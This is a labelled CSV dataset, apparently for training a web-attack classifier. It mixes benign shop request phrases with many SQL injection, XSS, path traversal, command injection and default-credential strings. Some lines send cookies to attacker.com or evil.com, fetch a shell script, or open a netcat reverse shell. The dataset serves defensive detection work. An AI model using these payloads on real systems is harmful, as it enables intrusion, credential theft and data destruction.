text,label
"';alert(String.fromCharCode(88,83,83))//",1
<ScRiPt>alert(1)</ScRiPt>,1
' OR 'x'='x,1
history order days 30 view for req356,0
<input onfocus=alert(1) autofocus>,1
last days for view req523,0
data report as export csv req130,0
GET /server-status HTTP/1.1,1
username=administrator&password=12345,1
../../../../proc/self/environ,1
email with register new account req586,0
view product return policy for req799,0
; ping -c 4 attacker.com,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
../../wp-config.php,1
| uname -a,1
<svg><script>alert(1)</script></svg>,1
| uname -a,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
recommendations history view on based req333,0
multiple failed login attempts detected for admin,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
username=admin&password=password,1
link email reset req956,0
<script>alert('XSS')</script>,1
1; DROP TABLE users--,1
by brand apply name req187,0
' OR 'x'='x,1
username=admin&password=123456,1
on map view req68,0
id=2 OR 1=1,1
/var/log/apache2/access.log,1
../.env,1
to seller message send support req769,0
' OR 1=1#,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
<SCRIPT>alert('XSS')</SCRIPT>,1
repeated authentication failure admin account locked,1
javascript:alert(document.cookie),1
GET /.htaccess HTTP/1.1,1
order download invoice number for req1018,0
payment card with checkout req1144,0
<svg><script>alert(1)</script></svg>,1
products compare specifications req503,0
username=admin&password=superman,1
submit form feedback for website req105,0
data as export req568,0
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
javascript:alert(document.cookie),1
view panel settings req12,0
terms conditions view req410,0
GET /api/swagger.json HTTP/1.1,1
"1 UNION SELECT @@version,NULL--",1
dashboard get profile account for req234,0
username=admin&password=password,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
1' ORDER BY 10--,1
admin' AND 1=1--,1
GET /admin/config.php HTTP/1.1,1
1'; WAITFOR DELAY '0:0:5'--,1
' OR 'x'='x,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
admin' AND 1=1--,1
' OR 1=1#,1
username=administrator&password=12345,1
| uname -a,1
<a href='javascript:alert(1)'>click</a>,1
<SCRIPT>alert('XSS')</SCRIPT>,1
payment credit checkout req1088,0
<input onfocus=alert(1) autofocus>,1
GET /admin/config.php HTTP/1.1,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
; ping -c 4 attacker.com,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
account update address for billing req864,0
../.env,1
account user dashboard get req171,0
username=admin&password=qwerty,1
express preference to set req29,0
export as report data csv req1089,0
report as csv data req250,0
change language arabic to req38,0
days history view req412,0
<audio src=1 onerror=alert(1)>,1
<textarea onfocus=alert(1) autofocus>,1
current from logout session req961,0
repeated authentication failure admin account locked,1
billing account update address for req121,0
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
for update order shipping address req263,0
tracking number track req1133,0
by name filter apply brand req510,0
....//....//etc/passwd,1
csv report export data as req351,0
1' OR '1'='1,1
apply filter name brand by req326,0
submit website form feedback req680,0
../.env,1
GET /robots.txt scan probe reconnaissance,1
password spray attack detected multiple users,1
$(whoami),1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
../../../../proc/self/environ,1
current session logout from req1062,0
for invoice download number order req785,0
for by products search electronics category req748,0
price filter range to req241,0
shipping address update for order req823,0
for get profile req760,0
account register with email new req870,0
username=admin&password=superman,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
invoice download number order for req451,0
GET /backup.sql HTTP/1.1,1
billing update account address for req745,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
item availability store req811,0
search books about learning req550,0
order shipping for address update req763,0
; id,1
; ls -la,1
| wget http://attacker.com/shell.sh,1
1' GROUP BY 1--,1
; ls -la,1
../../../etc/shadow,1
' HAVING 1=1--,1
<div onmouseover=alert(1)>hover</div>,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
; ls -la,1
section products view related req396,0
to seller message send support req6,0
javascript:alert(document.cookie),1
& net user hacker Password1 /add,1
two factor enable authentication req26,0
..\..\..\windows\system32\drivers\etc\hosts,1
1'; WAITFOR DELAY '0:0:5'--,1
recommendations based view history on req858,0
mobile phones browse category req1101,0
GET /config.bak HTTP/1.1,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
username=admin&password=admin123,1
../.env,1
mobile category phones req447,0
electronics for category by products search req364,0
1' AND SLEEP(5)--,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
/var/log/apache2/access.log,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
../../../etc/shadow,1
<ScRiPt>alert(1)</ScRiPt>,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
GET /web.config HTTP/1.1,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
mobile category phones browse req679,0
password=1' OR '1'='1' /*,1
apply by name brand req773,0
GET /backup.sql HTTP/1.1,1
shipment track tracking number with req329,0
username=admin&password=abc123,1
1' GROUP BY 1--,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
../../../etc/shadow,1
two specifications products req378,0
express preference set to delivery req478,0
books search learning about machine req50,0
data export csv req661,0
../../../../proc/self/environ,1
multiple failed login attempts detected for admin,1
username=admin&password=123456,1
category phones mobile req1013,0
id to 42 add item product req1041,0
support contact for req603,0
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
username=user&password=pass,1
account change arabic to req1070,0
update shipping for order address req605,0
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
../../../../etc/passwd,1
refund request contact support for req115,0
; ping -c 4 attacker.com,1
1; DROP TABLE users--,1
& net user hacker Password1 /add,1
<iframe src=javascript:alert('XSS')>,1
$(whoami),1
add item 42 cart to req1010,0
$(whoami),1
1'; DELETE FROM orders WHERE 1=1--,1
..\..\..\windows\system32\drivers\etc\hosts,1
for return product req236,0
id=2 OR 1=1,1
& ipconfig,1
GET /robots.txt scan probe reconnaissance,1
<div onmouseover=alert(1)>hover</div>,1
1'; EXEC xp_cmdshell('whoami')--,1
settings view panel notification req1045,0
admin'--,1
save item later req795,0
and username with password req665,0
username=admin&password=admin123,1
1'; DELETE FROM orders WHERE 1=1--,1
update order shipping req509,0
history order last req159,0
' HAVING 1=1--,1
phones mobile category browse req291,0
username=admin&password=batman,1
; id,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
<iframe src=javascript:alert('XSS')>,1
"1 UNION SELECT username,password FROM users--",1
1'; WAITFOR DELAY '0:0:5'--,1
1; DROP TABLE users--,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
' OR 'x'='x,1
<textarea onfocus=alert(1) autofocus>,1
1; DROP TABLE users--,1
<select onfocus=alert(1) autofocus>,1
export csv as data req52,0
product link media social req17,0
; id,1
to cart item req633,0
two factor authentication enable req801,0
"';alert(String.fromCharCode(88,83,83))//",1
; id,1
1'; EXEC xp_cmdshell('whoami')--,1
browse mobile phones req294,0
<a href='javascript:alert(1)'>click</a>,1
username=admin&password=letmein,1
& ipconfig,1
1' GROUP BY 1--,1
apply checkout discount at coupon req1160,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
1'; WAITFOR DELAY '0:0:5'--,1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
1'; EXEC xp_cmdshell('whoami')--,1
website submit for feedback form req1053,0
filter apply name brand by req719,0
GET /.htaccess HTTP/1.1,1
report export data as csv req625,0
<select onfocus=alert(1) autofocus>,1
username=admin&password=password,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
get account profile req340,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
; ping -c 4 attacker.com,1
by brand name apply filter req81,0
| wget http://attacker.com/shell.sh,1
add 42 product cart item id req638,0
password=1' OR '1'='1' /*,1
username=admin&password=superman,1
<svg onload=alert(document.domain)>,1
1' ORDER BY 10--,1
javascript:alert(document.cookie),1
; ls -la,1
& ipconfig,1
username=admin'/*,1
1' OR 1=1--,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
download invoice number for order req327,0
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
preference delivery express set to req1113,0
terms conditions and page view req824,0
php://filter/convert.base64-encode/resource=config.php,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
username=admin&password=superman,1
price to range 500 100 by req1168,0
id=2 OR 1=1,1
view notification settings panel req1019,0
username=admin&password=admin123,1
social link share media via product req722,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
arabic change language account to req1003,0
last view order days 30 req809,0
email subscribe with newsletter to req672,0
"1 UNION SELECT @@version,NULL--",1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
with checkout payment credit card req320,0
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
account for billing address req967,0
& net user hacker Password1 /add,1
<a href='javascript:alert(1)'>click</a>,1
repeated authentication failure admin account locked,1
; cat /etc/shadow,1
arabic change to language account req375,0
to add id cart req514,0
GET /.git/config HTTP/1.1,1
email reset password req579,0
username=admin&password=123456,1
policy view return req213,0
filter by apply name req788,0
GET /console HTTP/1.1,1
<input onfocus=alert(1) autofocus>,1
email to with newsletter req264,0
range 100 price req24,0
GET /server-status HTTP/1.1,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
GET /admin/config.php HTTP/1.1,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
username=admin'/*,1
username=admin&password=password,1
data csv as export report req911,0
& ipconfig,1
../../../etc/shadow,1
credit payment card req1017,0
php://filter/convert.base64-encode/resource=config.php,1
website feedback submit req221,0
<svg><script>alert(1)</script></svg>,1
GET /actuator/env HTTP/1.1,1
& ipconfig,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
"1 UNION SELECT @@version,NULL--",1
by electronics for category req938,0
later to wishlist for req97,0
login with password username req1181,0
..\..\..\windows\system32\drivers\etc\hosts,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
<object data=javascript:alert(1)>,1
invoice number for order download req162,0
../../.git/config,1
1' ORDER BY 10--,1
for view days last req1139,0
express to delivery preference req549,0
GET /console HTTP/1.1,1
%3Cscript%3Ealert(1)%3C/script%3E,1
username=admin&password=qwerty,1
for shipping address update order req975,0
recommendations based history on view req155,0
../../../../proc/self/environ,1
get user account profile req837,0
1'; EXEC xp_cmdshell('whoami')--,1
terms conditions and page view req621,0
phones browse mobile req827,0
"1' UNION ALL SELECT NULL,NULL,NULL--",1
<a href='javascript:alert(1)'>click</a>,1
"; python -c 'import socket,subprocess'",1
return view policy for product req563,0
login password and with username req245,0
product media link share req325,0
username=admin&password=admin123,1
learning books machine req997,0
admin'--,1
csv export report data as req968,0
username=admin'/*,1
; cat /etc/shadow,1
username=user&password=pass,1
category mobile phones browse req86,0
| uname -a,1
from session logout current req54,0
& ipconfig,1
GET /wp-admin HTTP/1.1,1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
for product return req952,0
file:///etc/passwd,1
<object data=javascript:alert(1)>,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
repeated authentication failure admin account locked,1
username=admin&password=1234567890,1
discount apply coupon checkout at req72,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
link social via req276,0
<video src=1 onerror=alert(1)>,1
../../wp-config.php,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
../../../etc/shadow,1
/etc/passwd%00,1
product social link req718,0
1' ORDER BY 10--,1
articles latest get req544,0
php://filter/convert.base64-encode/resource=config.php,1
....//....//etc/passwd,1
' HAVING 1=1--,1
"; python -c 'import socket,subprocess'",1
username=admin&password=batman,1
1'; WAITFOR DELAY '0:0:5'--,1
username=admin&password=1234567890,1
listing sort newest arrivals by req388,0
for item store check req1031,0
GET /web.config HTTP/1.1,1
GET /.git/config HTTP/1.1,1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
; whoami,1
password with login and username req417,0
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
username=admin&password=batman,1
"1 UNION SELECT @@version,NULL--",1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
email subscribe with to req895,0
settings notification panel view req275,0
credit payment card checkout with req179,0
admin' AND 1=1--,1
login attempt failed username admin invalid credentials,1
../.env,1
product via link media req1140,0
../../../../var/www/html/config.php,1
history recommendations view based on req270,0
to range by results price req901,0
GET /phpmyadmin HTTP/1.1,1
locations map store on view req871,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
email to with subscribe newsletter req49,0
' HAVING 1=1--,1
../../wp-config.php,1
1' AND SLEEP(5)--,1
to change arabic account language req61,0
browse mobile category phones req711,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
username=admin'/*,1
to send seller message support req433,0
password login with username and req875,0
and terms conditions req951,0
days for 30 order last view req494,0
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
admin'--,1
<video src=1 onerror=alert(1)>,1
5 review product rate stars req848,0
username=user&password=pass,1
checkout at apply req776,0
brute force attempt on login endpoint from single ip,1
username=admin&password=letmein,1
' HAVING 1=1--,1
& net user hacker Password1 /add,1
results by filter 100 req441,0
<body onload=alert('XSS')>,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
card payment credit with checkout req180,0
category electronics search for by req684,0
; cat /etc/shadow,1
username with login and req687,0
../../../../var/www/html/config.php,1
results 100 to req395,0
coupon at checkout apply discount req903,0
shipping order address for req258,0
php://filter/convert.base64-encode/resource=config.php,1
../../../../etc/passwd,1
locations on view map req787,0
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
id 42 add item req59,0
apply filter brand name by req114,0
"1 UNION SELECT @@version,NULL--",1
item store for check req65,0
and login password username with req374,0
order number invoice for download req819,0
reset link via email password req977,0
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
update order address shipping req1022,0
GET /.git/config HTTP/1.1,1
1'; DELETE FROM orders WHERE 1=1--,1
browse mobile category phones req199,0
related view section req19,0
username=test&password=test,1
for item later to save req214,0
<script>alert('XSS')</script>,1
admin'--,1
..%2F..%2F..%2Fetc%2Fpasswd,1
username=admin'/*,1
browse mobile phones category req421,0
....//....//etc/passwd,1
`id`,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
../../../etc/shadow,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
../../wp-config.php,1
days 30 for view order req195,0
; ping -c 4 attacker.com,1
<audio src=1 onerror=alert(1)>,1
id 42 product item cart req885,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
GET /crossdomain.xml HTTP/1.1,1
last for order view 30 days req141,0
; ls -la,1
by filter brand name apply req887,0
track with shipment tracking number req728,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
card payment with req628,0
feed latest articles news get req1119,0
..%2F..%2F..%2Fetc%2Fpasswd,1
GET /backup.sql HTTP/1.1,1
../../../../etc/passwd,1
view policy for return req317,0
feedback submit form req689,0
GET /crossdomain.xml HTTP/1.1,1
|| nc -e /bin/sh attacker.com 4444,1
GET /web.config HTTP/1.1,1
via link social product share media req508,0
1' OR 1=1--,1
terms and view page conditions req725,0
request contact support for req411,0
password spray attack detected multiple users,1
with account new register req73,0
enable factor two authentication req698,0
credit card payment with checkout req660,0
42 id add product cart to req1143,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
item 42 product req574,0
1'; WAITFOR DELAY '0:0:5'--,1
; ping -c 4 attacker.com,1
specifications two products req992,0
../../../../var/www/html/config.php,1
<textarea onfocus=alert(1) autofocus>,1
at apply discount req338,0
specifications compare two products req279,0
<script>alert('XSS')</script>,1
<details open ontoggle=alert(1)>,1
<a href='javascript:alert(1)'>click</a>,1
| cat /etc/passwd,1
../../.git/config,1
1'; WAITFOR DELAY '0:0:5'--,1
availability item store check req559,0
; ls -la,1
seller message support send req469,0
email password via link reset req1026,0
profile picture jpeg req43,0
via password link req154,0
1'; EXEC xp_cmdshell('whoami')--,1
conditions view terms and req796,0
GET /config.bak HTTP/1.1,1
| uname -a,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
GET /admin/config.php HTTP/1.1,1
<body background=javascript:alert(1)>,1
; whoami,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
../../../../proc/self/environ,1
../../../etc/shadow,1
website feedback form for submit req299,0
GET /api/swagger.json HTTP/1.1,1
<input onfocus=alert(1) autofocus>,1
to add item id product req182,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
filter apply name by brand req849,0
feed latest news get articles req1035,0
jpeg format upload picture profile req675,0
<img src=x onerror=alert(1)>,1
username=admin'/*,1
GET /server-status HTTP/1.1,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
machine books about search learning req430,0
| uname -a,1
view terms and req313,0
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
picture jpeg format upload profile req496,0
GET /backup.sql HTTP/1.1,1
GET /robots.txt scan probe reconnaissance,1
"1 UNION SELECT @@version,NULL--",1
<div onmouseover=alert(1)>hover</div>,1
save wishlist for req889,0
| uname -a,1
& ipconfig,1
; cat /etc/shadow,1
42 cart item product req273,0
../../wp-config.php,1
session current logout from req1195,0
GET /web.config HTTP/1.1,1
username=admin&password=1234567890,1
link via product req1121,0
for download invoice order req646,0
products two specifications req981,0
to 500 by price filter results req178,0
GET /.git/config HTTP/1.1,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
store availability for req391,0
multiple failed login attempts detected for admin,1
& net user hacker Password1 /add,1
website feedback submit for form req751,0
..%2F..%2F..%2Fetc%2Fpasswd,1
1' AND SLEEP(5)--,1
<body background=javascript:alert(1)>,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
; ls -la,1
username=admin&password=admin123,1
via link media product social req735,0
machine books learning about search req1020,0
' OR 'x'='x,1
two authentication factor req717,0
username=admin&password=1234567890,1
GET /config.bak HTTP/1.1,1
1' AND SLEEP(5)--,1
; ping -c 4 attacker.com,1
| wget http://attacker.com/shell.sh,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
../.env,1
address update shipping for order req1179,0
upload profile format jpeg picture req373,0
; id,1
account for user dashboard get profile req160,0
username=root&password=root,1
<textarea onfocus=alert(1) autofocus>,1
<audio src=1 onerror=alert(1)>,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
repeated authentication failure admin account locked,1
' OR 'x'='x,1
<body onload=alert('XSS')>,1
panel notification view settings req1011,0
username=admin&password=admin123,1
1'; WAITFOR DELAY '0:0:5'--,1
terms view conditions page and req262,0
<SCRIPT>alert('XSS')</SCRIPT>,1
enable two factor authentication req584,0
shipping for order address update req30,0
view products section related req826,0
listing newest arrivals sort req1128,0
<script>alert('XSS')</script>,1
../../../etc/shadow,1
"; python -c 'import socket,subprocess'",1
<details open ontoggle=alert(1)>,1
delivery preference express req831,0
multiple failed login attempts detected for admin,1
1'; WAITFOR DELAY '0:0:5'--,1
username=admin&password=password,1
username=root&password=root,1
for save to req650,0
GET /server-status HTTP/1.1,1
../../wp-config.php,1
; id,1
admin' AND 1=1--,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
address shipping update for req842,0
current logout session from req532,0
discount coupon checkout req845,0
1'; DELETE FROM orders WHERE 1=1--,1
account to language arabic change req281,0
| wget http://attacker.com/shell.sh,1
<audio src=1 onerror=alert(1)>,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
<div onmouseover=alert(1)>hover</div>,1
discount apply checkout coupon at req528,0
news get latest req453,0
checkout credit with payment card req643,0
GET /admin/config.php HTTP/1.1,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
id=2 OR 1=1,1
about machine search books learning req703,0
website feedback form for submit req45,0
<div onmouseover=alert(1)>hover</div>,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
compare specifications two products req235,0
<body onload=alert('XSS')>,1
brand apply filter by req286,0
<ScRiPt>alert(1)</ScRiPt>,1
../../../etc/shadow,1
password and with login req1192,0
mobile phones browse category req954,0
submit for feedback req843,0
view page terms and conditions req1162,0
password=1' OR '1'='1' /*,1
coupon at checkout discount req284,0
view days last history order 30 req815,0
panel view settings notification req764,0
enable authentication two req109,0
<SCRIPT>alert('XSS')</SCRIPT>,1
username=admin&password=admin,1
/var/log/apache2/access.log,1
GET /api/swagger.json HTTP/1.1,1
conditions terms page view and req727,0
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
../../.git/config,1
current from logout session req427,0
as export data report csv req702,0
refund for request support contact req381,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
php://filter/convert.base64-encode/resource=config.php,1
<body onload=alert('XSS')>,1
brute force attempt on login endpoint from single ip,1
1'; DELETE FROM orders WHERE 1=1--,1
enable two factor authentication req444,0
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
and with password login req771,0
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
<video src=1 onerror=alert(1)>,1
map view locations store on req260,0
1' GROUP BY 1--,1
coupon checkout discount at apply req836,0
"id=1 AND 1=CONVERT(int,@@version)--",1
' OR 1=1#,1
multiple failed login attempts detected for admin,1
username=admin&password=123456,1
username=admin&password=1234567890,1
password spray attack detected multiple users,1
username=admin&password=admin,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
return for policy req629,0
stars review rate req569,0
express preference set to req131,0
GET /wp-admin HTTP/1.1,1
login attempt failed username admin invalid credentials,1
rate review product 5 stars req95,0
username=admin&password=admin123,1
1'; DELETE FROM orders WHERE 1=1--,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
<ScRiPt>alert(1)</ScRiPt>,1
../../../../etc/passwd,1
GET /server-status HTTP/1.1,1
GET /config.bak HTTP/1.1,1
admin'--,1
& ipconfig,1
../../../../var/www/html/config.php,1
1; DROP TABLE users--,1
admin'--,1
picture jpeg upload req923,0
1' GROUP BY 1--,1
admin'--,1
../../../../var/www/html/config.php,1
<object data=javascript:alert(1)>,1
account email with new register req39,0
|| nc -e /bin/sh attacker.com 4444,1
1' ORDER BY 10--,1
factor authentication enable two req525,0
